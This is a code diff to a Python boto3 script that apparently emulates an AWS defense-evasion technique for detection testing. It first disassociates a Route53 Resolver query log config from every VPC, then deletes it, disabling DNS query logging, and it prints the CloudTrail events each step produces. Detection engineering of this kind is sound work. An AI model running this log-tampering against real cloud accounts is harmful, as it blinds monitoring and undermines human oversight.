@@ -26,6 +26,8 @@ if hasattr(sys.stdout, "reconfigure"):
 if hasattr(sys.stderr, "reconfigure"):
     sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
 
+import time
+
 import boto3
 from botocore.exceptions import ClientError
 
@@ -57,16 +59,53 @@ def run(outputs: dict, region: str = "us-east-1") -> None:
 
     r53_client = _bootstrap_session(outputs, region).client("route53resolver", region_name=region)
 
-    # ── Step 1: Delete the resolver query log config ────────────────────────
-    banner("Step 1 - Delete Route53 Resolver query log config (DeleteResolverQueryLogConfig)")
+    # ── Step 1: Disassociate the config from every VPC ──────────────────────
+    # DeleteResolverQueryLogConfig is rejected while any VPC is still associated
+    # (RSLVR-01201). Detaching the config from the VPC produces the same DNS
+    # blind spot and is itself a defense-evasion signal.
+    banner("Step 1 - Disassociate query log config from VPCs (DisassociateResolverQueryLogConfig)")
+    assoc_ids = []
+    try:
+        paginator = r53_client.get_paginator("list_resolver_query_log_config_associations")
+        for page in paginator.paginate(
+            Filters=[{"Name": "ResolverQueryLogConfigId", "Values": [config_id]}]
+        ):
+            for a in page.get("ResolverQueryLogConfigAssociations", []):
+                if a.get("Status") in ("DELETED", "FAILED"):
+                    continue
+                r53_client.disassociate_resolver_query_log_config(
+                    ResolverQueryLogConfigId=config_id, ResourceId=a["ResourceId"],
+                )
+                assoc_ids.append(a["Id"])
+                print(f"  [+] Disassociated from VPC {a['ResourceId']} (assoc {a['Id']})")
+                print("  [!] CloudTrail event: route53resolver:DisassociateResolverQueryLogConfig")
+    except ClientError as exc:
+        print(f"  [!] Disassociate failed: {exc}")
+        raise
+
+    # Wait for disassociations to finish (usually seconds).
+    for _ in range(30):
+        remaining = [
+            a for a in r53_client.list_resolver_query_log_config_associations(
+                Filters=[{"Name": "ResolverQueryLogConfigId", "Values": [config_id]}]
+            ).get("ResolverQueryLogConfigAssociations", [])
+            if a.get("Status") not in ("DELETED", "FAILED")
+        ]
+        if not remaining:
+            break
+        time.sleep(4)
+
+    # ── Step 2: Delete the resolver query log config ────────────────────────
+    banner("Step 2 - Delete Route53 Resolver query log config (DeleteResolverQueryLogConfig)")
     try:
         r53_client.delete_resolver_query_log_config(ResolverQueryLogConfigId=config_id)
         print(f"  [+] Resolver query log config deleted: {config_id}")
         print("  [!] CloudTrail event: route53resolver:DeleteResolverQueryLogConfig")
-        print("  [!] DNS query logging is now DISABLED for associated VPCs.")
+        print("  [!] DNS query logging is now DISABLED for the affected VPCs.")
     except ClientError as exc:
         print(f"  [!] DeleteResolverQueryLogConfig failed: {exc}")
         raise
 
     banner("Complete")
-    print("CloudTrail event generated: route53resolver:DeleteResolverQueryLogConfig")
+    print("CloudTrail events generated: route53resolver:DisassociateResolverQueryLogConfig, "
+          "route53resolver:DeleteResolverQueryLogConfig")
